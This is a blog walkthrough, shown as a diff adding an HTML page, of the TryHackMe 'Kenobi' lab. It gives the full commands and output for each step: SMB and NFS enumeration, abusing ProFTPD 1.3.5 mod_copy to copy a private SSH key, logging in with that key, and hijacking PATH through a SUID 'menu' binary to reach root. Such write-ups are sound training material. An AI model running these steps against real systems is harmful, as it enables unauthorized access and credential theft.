@@ -1,0 +1,474 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Kenobi | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Kenobi from TryHackMe."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/5_kenobi/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Kenobi</h1> <p class="post-description">Kenobi from TryHackMe.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/kenobi/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Kenobi Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/r/room/kenobi" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> “Only a Sith deals in absolutes.” Well, we are going to absolutely smash this box.</p> <p>To get started, let us give nmap a run and see what it says.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">--script</span> vuln <span class="nt">-oN</span> nmap 10.10.68.141
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-07 03:16 AEDT
+Nmap scan report <span class="k">for </span>10.10.68.141
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 993 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+
+&lt;snip&gt;
+
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+
+&lt;snip&gt;
+
+80/tcp   open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+
+&lt;snip&gt;
+
+111/tcp  open  rpcbind     2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+
+&lt;snip&gt;
+
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+2049/tcp open  nfs         2-4 <span class="o">(</span>RPC <span class="c">#100003)</span>
+
+&lt;snip&gt;
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>351.30 seconds
+
+</code></pre></div></div> <p><br> Seeing port 445, use smbclient -L IP to list all of the shares on SMB.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> //10.10.68.141                         
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec]:
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        anonymous       Disk      
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>kenobi server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+
+        Server               Comment
+        <span class="nt">---------</span>            <span class="nt">-------</span>
+
+        Workgroup            Master
+        <span class="nt">---------</span>            <span class="nt">-------</span>
+        WORKGROUP            KENOBI
+
+</code></pre></div></div> <p><br> Run the nmap scripts to enumerate SMB.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>nmap <span class="nt">-p</span> 445 <span class="nt">--script</span><span class="o">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.68.141
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-07 03:32 AEDT
+Nmap scan report <span class="k">for </span>10.10.68.141
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   <span class="se">\\</span>10.10.68.141<span class="se">\I</span>PC<span class="nv">$:</span> 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service <span class="o">(</span>kenobi server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+|     Users: 3
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\t</span>mp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   <span class="se">\\</span>10.10.68.141<span class="se">\a</span>nonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\h</span>ome<span class="se">\k</span>enobi<span class="se">\s</span>hare
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   <span class="se">\\</span>10.10.68.141<span class="se">\p</span>rint<span class="nv">$:</span> 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\v</span>ar<span class="se">\l</span>ib<span class="se">\s</span>amba<span class="se">\p</span>rinters
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>40.09 seconds
+
+</code></pre></div></div> <p><br> Use smbclient to connect to the anonymous share.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>smbclient //10.10.68.141/anonymous
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> 
+
+</code></pre></div></div> <p><br> Use ls to get a list of files available on the share.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>smbclient //10.10.68.141/anonymous
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Sep  4 20:49:09 2019
+  ..                                  D        0  Wed Sep  4 20:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 20:49:09 2019
+
+                9204224 blocks of size 1024. 6876716 blocks available
+smb: <span class="se">\&gt;</span>
+
+</code></pre></div></div> <p><br> Get the log.txt file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get log.txt
+getting file <span class="se">\l</span>og.txt of size 12237 as log.txt <span class="o">(</span>11.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 11.3 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div> <p><br> Check out the log.txt file that was just nicked. Notice that it shows the path to a private key.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span><span class="nb">cat </span>log.txt  
+Generating public/private rsa key pair.
+Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/kenobi/.ssh/id_rsa<span class="o">)</span>: 
+Created directory <span class="s1">'/home/kenobi/.ssh'</span><span class="nb">.</span>
+Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
+Enter same passphrase again: 
+Your identification has been saved <span class="k">in</span> /home/kenobi/.ssh/id_rsa.
+Your public key has been saved <span class="k">in</span> /home/kenobi/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
+The key<span class="s1">'s randomart image is:
++---[RSA 2048]----+
+|                 |
+|           ..    |
+|        . o. .   |
+|       ..=o +.   |
+|      . So.o++o. |
+|  o ...+oo.Bo*o  |
+| o o ..o.o+.@oo  |
+|  . . . E .O+= . |
+|     . .   oBo.  |
++----[SHA256]-----+
+
+&lt;snip&gt;
+</span></code></pre></div></div> <p><br> Use nmap to enumerate the NFS shares.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>nmap <span class="nt">-p</span> 111 <span class="nt">--script</span><span class="o">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.68.141
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-07 03:37 AEDT
+Nmap scan report <span class="k">for </span>10.10.68.141
+Host is up <span class="o">(</span>0.28s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount: 
+|_  /var <span class="k">*</span>
+| nfs-statfs: 
+|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|_  /var        9204224.0  1836916.0  6876712.0  22%   16.0T        32000
+| nfs-ls: Volume /var
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  <span class="nb">.</span>
+| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
+| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
+| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
+| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
+| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  <span class="nb">local</span>
+| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
+| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
+| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
+|_
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>6.76 seconds
+</code></pre></div></div> <p><br> Use netcat to connect to the ftp service to snag the version.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>nc 10.10.68.141 21                                               
+220 ProFTPD 1.3.5 Server <span class="o">(</span>ProFTPD Default Installation<span class="o">)</span> <span class="o">[</span>10.10.68.141]
+^C
+</code></pre></div></div> <p><br> Use searchsploit to fing the ftp service and version.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>searchsploit ProFTP 1.3.5                           
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                                                                                            |  Path
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                                                                                                                                 | linux/remote/37262.rb
+ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Remote Command Execution                                                                                                                                                       | linux/remote/36803.py
+ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Remote Command Execution <span class="o">(</span>2<span class="o">)</span>                                                                                                                                                   | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                                                                                                                                                 | linux/remote/36742.txt
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div> <p><br> Read the vulnerability to figure out what it does. Notice how it explains how to copy and paste system files.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span><span class="nb">cp</span> <span class="si">$(</span>locate 36742.txt<span class="si">)</span> <span class="nb">.</span>
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span><span class="nb">cat </span>36742.txt           
+Description TJ Saunders 2015-04-07 16:35:03 UTC
+Vadim Melihow reported a critical issue with proftpd installations that use the
+mod_copy module<span class="s1">'s SITE CPFR/SITE CPTO commands; mod_copy allows these commands
+to be used by *unauthenticated clients*:
+
+---------------------------------
+Trying 80.150.216.115...
+Connected to 80.150.216.115.
+Escape character is '</span>^]<span class="s1">'.
+220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
+site help
+214-The following SITE commands are recognized (* =&gt;'</span>s unimplemented<span class="o">)</span>
+214-CPFR &lt;sp&gt; pathname
+214-CPTO &lt;sp&gt; pathname
+214-UTIME &lt;sp&gt; YYYYMMDDhhmm[ss] &lt;sp&gt; path
+214-SYMLINK &lt;sp&gt; <span class="nb">source</span> &lt;sp&gt; destination
+214-RMDIR &lt;sp&gt; path
+214-MKDIR &lt;sp&gt; path
+214-The following SITE extensions are recognized:
+214-RATIO <span class="nt">--</span> show all ratios <span class="k">in </span>effect
+214-QUOTA
+214-HELP
+214-CHGRP
+214-CHMOD
+214 Direct comments to root@www01a
+site cpfr /etc/passwd
+350 File or directory exists, ready <span class="k">for </span>destination name
+site cpto /tmp/passwd.copy
+250 Copy successful
+<span class="nt">-----------------------------------------</span>
+
+He provides another, scarier example:
+
+<span class="nt">------------------------------</span>
+site cpfr /etc/passwd
+350 File or directory exists, ready <span class="k">for </span>destination name
+site cpto &lt;?php phpinfo<span class="o">()</span><span class="p">;</span> ?&gt;
+550 cpto: Permission denied
+site cpfr /proc/self/fd/3
+350 File or directory exists, ready <span class="k">for </span>destination name
+site cpto /var/www/test.php
+
+test.php now contains
+<span class="nt">----------------------</span>
+2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
+<span class="o">(</span>slon-P5Q.lan[192.168.3.193]<span class="o">)</span>: error rewinding scoreboard: Invalid argument
+2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
+<span class="o">(</span>slon-P5Q.lan[192.168.3.193]<span class="o">)</span>: FTP session opened.
+2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q
+<span class="o">(</span>slon-P5Q.lan[192.168.3.193]<span class="o">)</span>: error opening destination file <span class="s1">'/&lt;?php
+phpinfo(); ?&gt;'</span> <span class="k">for </span>copying: Permission denied
+<span class="nt">-----------------------</span>
+
+test.php contains contain correct php script <span class="s2">"&lt;?php phpinfo(); ?&gt;"</span> which
+can be run by the php interpreter
+
+Source: http://bugs.proftpd.org/show_bug.cgi?id<span class="o">=</span>4169 <span class="nt">---------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div> <p><br> Use SITE CPFR and SITE CPTO to copy the id_rsa discovered above into the tmp folder in the /var folder from the nfs scans, also above.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>nc 10.10.213.34 21                                            
+220 ProFTPD 1.3.5 Server <span class="o">(</span>ProFTPD Default Installation<span class="o">)</span> <span class="o">[</span>10.10.213.34]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready <span class="k">for </span>destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+</code></pre></div></div> <p><br> Mount and enumerate the NFS shares.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span><span class="nb">sudo </span>mount 10.10.213.34:/var kenobiNFS              
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>sec: 
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> kenobiNFS 
+total 56
+drwxr-xr-x 14 root root  4096 Sep  4  2019 <span class="nb">.</span>
+drwxrwxr-x  3 sec  sec   4096 Jan  7 16:13 ..
+drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff 4096 Apr 13  2016 <span class="nb">local
+</span>lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -&gt; /run/lock
+drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
+drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
+lrwxrwxrwx  1 root root     4 Sep  4  2019 run -&gt; /run
+drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
+drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root  4096 Jan  7 16:03 tmp
+drwxr-xr-x  3 root root  4096 Sep  4  2019 www
+</code></pre></div></div> <p><br> Copy the id_rsa file to a local file, chmod the permissions to 600, and ssh using this file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span><span class="nb">cp </span>kenobiNFS/tmp/id_rsa <span class="nb">.</span>  
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span><span class="nb">sudo chmod </span>600 id_rsa                 
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/kenobi]
+└─<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa kenobi@10.10.213.34 
+The authenticity of host <span class="s1">'10.10.213.34 (10.10.213.34)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.213.34<span class="s1">' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$
+</span></code></pre></div></div> <p><br> Get the user flag. Remember to add the ifconfig.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kenobi@kenobi:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+&lt;redacted&gt;
+kenobi@kenobi:~<span class="nv">$ </span>ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:18:9c:aa:ef:d7  
+          inet addr:10.10.213.34  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::18:9cff:feaa:efd7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:399 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:564 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:64551 <span class="o">(</span>64.5 KB<span class="o">)</span>  TX bytes:89544 <span class="o">(</span>89.5 KB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:172 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:172 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:12560 <span class="o">(</span>12.5 KB<span class="o">)</span>  TX bytes:12560 <span class="o">(</span>12.5 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> Find all of the files with the user stickybit set.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kenobi@kenobi:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+</code></pre></div></div> <p><br> Notice the /usr/bin/menu command. Let’s give it a strings to see what it says. Notice commands like the curl do not use the full path.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kenobi@kenobi:~<span class="nv">$ </span>strings /usr/bin/menu 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+__stack_chk_fail
+<span class="nb">printf
+</span>system
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+UH-<span class="sb">`</span>
+AWAVA
+AUATL
+<span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
+<span class="k">***************************************</span>
+1. status check
+2. kernel version
+3. ifconfig
+<span class="k">**</span> Enter your choice :
+curl <span class="nt">-I</span> localhost
+<span class="nb">uname</span> <span class="nt">-r</span>
+ifconfig
+ Invalid choice
+<span class="p">;</span><span class="k">*</span>3<span class="s2">$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7594
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+menu.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+_Jv_RegisterClasses
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+</span></code></pre></div></div> <p><br> Create a copy of /bin/sh in temp and call it curl. Chmod the permissions to 777. Export the /tmp folder to the path.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kenobi@kenobi:~<span class="nv">$ </span><span class="nb">cd</span> /tmp
+kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">echo</span> /bin/sh <span class="o">&gt;</span> curl
+kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 curl
+kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</code></pre></div></div> <p><br> Run the menu command again. Use option 1.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kenobi@kenobi:/tmp<span class="nv">$ </span>/usr/bin/menu
+
+<span class="k">***************************************</span>
+1. status check
+2. kernel version
+3. ifconfig
+<span class="k">**</span> Enter your choice :1
+<span class="c">#</span>
+</code></pre></div></div> <p><br> Get the root flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat /root/root.txt</span>
+&lt;redacted&gt;
+<span class="c"># ifconfig</span>
+eth0      Link encap:Ethernet  HWaddr 02:18:9c:aa:ef:d7  
+          inet addr:10.10.213.34  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::18:9cff:feaa:efd7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:1063 errors:0 dropped:0 overruns:0 frame:0
